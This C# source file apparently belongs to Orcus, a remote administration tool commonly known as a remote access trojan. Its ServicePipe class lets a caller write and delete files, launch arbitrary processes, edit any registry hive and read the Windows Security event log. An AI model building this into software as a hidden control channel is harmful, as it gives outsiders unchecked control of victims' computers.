using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Win32;
using Orcus.Service.Extensions;
using Orcus.Shared.Commands.Registry;
using RegistryHive = Orcus.Shared.Commands.Registry.RegistryHive;

namespace Orcus.Service
{
    public class ServicePipe : IServicePipe
    {
        public bool WriteFile(string fileName, string content)
        {
            try
            {
                File.WriteAllText(fileName, content);
            }
            catch (Exception)
            {
                return false;
            }

            return true;
        }

        public string StartProcess(string path, string arguments)
        {
            try
            {
                Process.Start(path, arguments);
                return null;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public bool DeleteFile(string fileName)
        {
            try
            {
                File.Delete(fileName);
            }
            catch (Exception)
            {
                return false;
            }

            return true;
        }

        public List<RegistrySubKey> GetRegistrySubKeys(string path, RegistryHive registryHive)
        {
            try
            {
                using (
                    var regKey = RegistryExtensions.OpenRegistry(registryHive)
                        .OpenSubKey(path, RegistryKeyPermissionCheck.ReadSubTree))
                {
                    var subKeys = new List<RegistrySubKey>();
                    foreach (var subKeyName in regKey.GetSubKeyNames())
                    {
                        var isEmpty = false;
                        try
                        {
                            using (var subKey = regKey.OpenSubKey(subKeyName, false))
                            {
                                isEmpty = subKey.GetSubKeyNames().Length == 0;
                            }
                        }
                        catch (Exception)
                        {
                        }

                        subKeys.Add(new RegistrySubKey
                        {
                            Name = subKeyName,
                            IsEmpty = isEmpty
                        });
                    }
                    return subKeys;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        public List<RegistryValue> GetRegistryValues(string path, RegistryHive registryHive)
        {
            try
            {
                using (var regKey = RegistryExtensions.OpenRegistry(registryHive).OpenSubKey(path, false))
                {
                    var valueList = new List<RegistryValue>();
                    foreach (var valueName in regKey.GetValueNames())
                    {
                        var kind = regKey.GetValueKind(valueName);
                        switch (kind)
                        {
                            case RegistryValueKind.String:
                                valueList.Add(new RegistryValueString
                                {
                                    Key = valueName,
                                    Value = (string) regKey.GetValue(valueName, string.Empty)
                                });
                                break;
                            case RegistryValueKind.ExpandString:
                                valueList.Add(new RegistryValueExpandString
                                {
                                    Key = valueName,
                                    Value = (string) regKey.GetValue(valueName, string.Empty)
                                });
                                break;
                            case RegistryValueKind.Binary:
                                valueList.Add(new RegistryValueBinary
                                {
                                    Key = valueName,
                                    Value = (byte[]) regKey.GetValue(valueName, new byte[] {})
                                });
                                break;
                            case RegistryValueKind.DWord:
                                valueList.Add(new RegistryValueDWord
                                {
                                    Key = valueName,
                                    Value = (uint) (int) regKey.GetValue(valueName, 0)
                                });
                                break;
                            case RegistryValueKind.MultiString:
                                valueList.Add(new RegistryValueMultiString
                                {
                                    Key = valueName,
                                    Value = (string[]) regKey.GetValue(valueName, new string[] {})
                                });
                                break;
                            case RegistryValueKind.QWord:
                                valueList.Add(new RegistryValueQWord
                                {
                                    Key = valueName,
                                    Value = (ulong) (long) regKey.GetValue(valueName, 0)
                                });
                                break;
                            default:
                                valueList.Add(new RegistryValueUnknown
                                {
                                    Key = valueName
                                });
                                break;
                        }
                    }
                    return valueList;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        public bool CreateSubKey(string path, RegistryHive registryHive)
        {
            try
            {
                RegistryExtensions.OpenRegistry(registryHive)
                    .CreateSubKey(path, RegistryKeyPermissionCheck.Default);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool CreateValue(string path, RegistryHive registryHive, RegistryValue registryValue)
        {
            try
            {
                using (var rootKey = RegistryExtensions.OpenRegistry(registryHive))
                using (var subKey = rootKey.OpenSubKey(path, true))
                    subKey.SetValue(registryValue.Key, registryValue.ValueObject);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool DeleteValue(string path, RegistryHive registryHive, string name)
        {
            try
            {
                using (var rootKey = RegistryExtensions.OpenRegistry(registryHive))
                using (var subKey = rootKey.OpenSubKey(path, true))
                    subKey.DeleteValue(name, true);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool DeleteSubKey(string path, RegistryHive registryHive)
        {
            try
            {
                using (var regKey = RegistryExtensions.OpenRegistry(registryHive))
                    regKey.DeleteSubKeyTree(path);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool IsAlive()
        {
            return true;
        }

        public string GetPath()
        {
            return Assembly.GetEntryAssembly().Location;
        }

        public List<Shared.Commands.EventLog.EventLogEntry> GetSecurityEventLog(int entryCount)
        {
            var eventLog = new EventLog("Security");
            try
            {
#pragma warning disable 618
                return eventLog.Entries.OfType<EventLogEntry>()
                    .TakeLast(300)
                    .Select(
                        x =>
                            new Shared.Commands.EventLog.EventLogEntry
                            {
                                EntryType = x.EntryType,
                                EventId = x.EventID,
                                Source = x.Source,
                                Timestamp = x.TimeGenerated,
                                Message = x.Message
                            }).ToList();
#pragma warning restore 618
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}